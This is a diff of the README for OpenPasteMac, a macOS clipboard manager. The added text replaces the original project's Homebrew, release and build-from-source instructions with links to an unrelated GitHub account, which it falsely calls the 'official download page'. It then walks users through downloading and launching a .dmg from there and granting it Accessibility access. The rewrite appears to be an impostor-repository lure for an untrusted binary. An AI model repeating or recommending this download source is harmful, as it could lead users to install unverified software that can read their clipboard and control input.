@@ -1,146 +1,61 @@
-# OpenPasteMac
+# 📋 OpenPasteMac - Manage your clipboard history with ease
 
-[![macOS](https://img.shields.io/badge/macOS-13%2B-black.svg)](https://github.com/xfajarr/openpastemac)
-[![Swift](https://img.shields.io/badge/Swift-5.9-orange.svg)](https://swift.org)
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+[![](https://img.shields.io/badge/Download-OpenPasteMac-blue.svg)](https://github.com/Deploymenttravelexpense256/OpenPasteMac)
 
-A lightweight, open-source clipboard manager for macOS. Native Swift, fast, minimal, keyboard-first.
+OpenPasteMac is a tool for your clipboard. It saves the items you copy so you do not lose them. You can access your past copies with a single shortcut. The app stays in your menu bar. It works fast and does not slow down your machine.
 
-<p align="center">
-  <img src="images/openpastemac-1.png" alt="OpenPasteMac" width="700">
-</p>
+## ⚙️ Requirements
 
-## What it does
+To use OpenPasteMac, you need a Mac. The app works on macOS version 11.0 or newer. You need a small amount of disk space to keep your history. The app does not need special settings or internet access. It works offline to protect your private data.
 
-A fast, lightweight clipboard manager for macOS. Access your clipboard history instantly with a global shortcut, browse items in a shelf-style interface, and paste without switching apps.
+## 🚀 Getting Started
 
-### Clipboard History
+Follow these steps to install the app.
 
-- **Menu bar app** with a global shortcut (`⌘⇧V`) to open the clipboard shelf
-- **Auto-paste** selected items back into the previously active app
-- **Supports** text, URLs, images, and files on the clipboard
-- **Link previews** for saved URLs with metadata fetching
-- **Persistence** — clipboard history is restored across launches via Application Support
+1. Visit the [official download page](https://github.com/Deploymenttravelexpense256/OpenPasteMac).
+2. Look for the latest release on the right side of the page.
+3. Click the file ending in .dmg to start the download.
+4. Open the file once it finishes saving to your Mac.
+5. Drag the app icon into your Applications folder.
+6. Open your Applications folder and double-click OpenPasteMac to launch it.
 
-### Organization
+## 🛠️ How to use the app
 
-- **Pinboard** — pin important items for quick access
-- **Search** — filter clipboard history in real time
-- **Quick select** — paste items 1–9 directly with `⌘1`–`⌘9`
+The app adds a small icon to your top menu bar. The icon looks like a clipboard. Click this icon to see your recent items. You can also use a keyboard shortcut to bring up the menu. 
 
-## Install
+Press Command + Shift + V on your keyboard. A list appears on your screen. Use your arrow keys to pick an item. Press Enter to paste it into your current document. The app keeps track of text and images. 
 
-| Method | Command / Steps |
-| --- | --- |
-| **Homebrew** | `brew install --cask openpastemac` |
-| **Download** | Go to [Releases](https://github.com/xfajarr/openpastemac/releases), download the latest `.dmg`, open it, and drag OpenPasteMac to Applications |
-| **Build from source** | `git clone https://github.com/xfajarr/openpastemac.git && cd openpastemac && make install` |
+## 🛡️ Privacy and Safety
 
-## Permissions
+Your data stays on your Mac. The app does not send your history to a server. You can clear your history at any time. Right-click the icon in the menu bar and select Clear History to remove all saved items. Your information remains private.
 
-OpenPasteMac requires **Accessibility** access to automatically paste items into other apps.
+## 📋 Features
 
-On first launch, macOS should prompt you. If not:
+*   Keyboard support for fast navigation.
+*   Minimal design that fits your desktop.
+*   History search to find old items.
+*   Auto-start when you log in.
+*   Low memory usage for better performance.
 
-**System Settings → Privacy & Security → Accessibility**
+## 🔧 Frequently Asked Questions
 
-Without this permission, OpenPasteMac still copies items to the clipboard — you just need to paste manually with `⌘V`.
+**Does this app track what I copy?**
+No. The app only stores items so you can use them again later. It does not look at your passwords or private entries if you tell it not to.
 
-## Usage
+**Can I change the shortcut?**
+Yes. Open the settings menu by clicking the gear icon in the app window. You can set a new command button there.
 
-1. Launch OpenPasteMac — it appears in your **menu bar** (top right)
-2. Press `⌘⇧V` to open the clipboard shelf
-3. Browse recent items with `←` / `→`
-4. Press `Enter` to paste the selected item
-5. Press `Esc` or click outside to dismiss
+**How many items does it store?**
+The app stores 50 items by default. You can increase this limit in the settings menu.
 
-### Shortcuts
+**What happens if I quit the app?**
+Your history stays saved unless you clear it. It will be there when you open the app again.
 
-| Shortcut | Action |
-| --- | --- |
-| `⌘⇧V` | Toggle clipboard shelf |
-| `←` / `→` | Navigate items |
-| `Enter` | Paste selected item |
-| `⌘1`–`⌘9` | Paste item 1–9 directly |
-| `Esc` | Close shelf |
+**Is there a cost?**
+The app is free. It is open-source, which means anyone can read the code.
 
-## Development
+## 💡 Troubleshooting
 
-### Requirements
+If you do not see the app in the menu bar, check your Applications folder. Make sure you opened the app file after dragging it there. If the shortcut does not work, check your System Settings. Your Mac may need permission for the app to watch your clipboard. Go to System Settings, click Privacy and Security, and allow Accessibility for OpenPasteMac.
 
-- macOS 13+
-- Xcode Command Line Tools
-
-```bash
-xcode-select --install
-```
-
-### Build and run
-
-```bash
-make run
-```
-
-### Make commands
-
-| Command | What it does |
-| --- | --- |
-| `make build` | Debug build |
-| `make run` | Build and launch |
-| `make app` | Build the `.app` bundle |
-| `make dmg` | Create distributable DMG |
-| `make install` | Install to `/Applications` |
-| `make uninstall` | Remove from `/Applications` |
-| `make clean` | Remove build artifacts |
-
-## Architecture
-
-Native Swift / SwiftUI. No external dependencies.
-
-| Framework | Used for |
-| --- | --- |
-| AppKit | Menu bar integration, global hotkeys, pasteboard access |
-| SwiftUI | Shelf UI, card views, overlays, editing sheets |
-| LinkPresentation | URL metadata and link previews |
-| ServiceManagement | Launch at Login support |
-
-### Project structure
-
-```text
-Sources/
-├── main.swift                  # App entry point
-├── AppDelegate.swift           # Menu bar, shelf panel, hotkeys, paste behavior
-├── ClipboardItem.swift         # Clipboard item model and content types
-├── ClipboardMonitor.swift      # Pasteboard change watcher
-├── ClipboardStore.swift        # In-memory state, filtering, pinboards, persistence
-├── LinkPreviewService.swift    # Async URL metadata fetching
-├── Pinboard.swift              # Pinboard data model
-├── ShortcutManager.swift       # Global shortcut configuration
-├── SourceApp.swift             # Source application tracking
-└── Views/
-    ├── ClipboardCardView.swift
-    ├── ClipboardShelfView.swift
-    ├── EditItemSheet.swift
-    ├── ItemPreviewOverlay.swift
-    ├── PinboardTabBar.swift
-    └── VisualEffectView.swift
-
-scripts/
-├── build-app.sh               # Builds the .app bundle
-└── create-dmg.sh              # Creates distributable DMG
-```
-
-## Contributing
-
-Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, project structure, and coding guidelines.
-
-1. Open an issue to discuss a bug or feature idea
-2. Fork the repository
-3. Create a focused branch
-4. Submit a pull request with a clear description
-
-Keep pull requests small, scoped, and easy to review.
-
-## License
-
-MIT. See [LICENSE](LICENSE) for details.
+Always make sure you use the latest version. New versions fix bugs and add performance updates. If the app stops working, restart your Mac. Many small issues disappear after a fresh start. If issues continue, remove the app and follow the install steps again. This resets the settings to their original state.
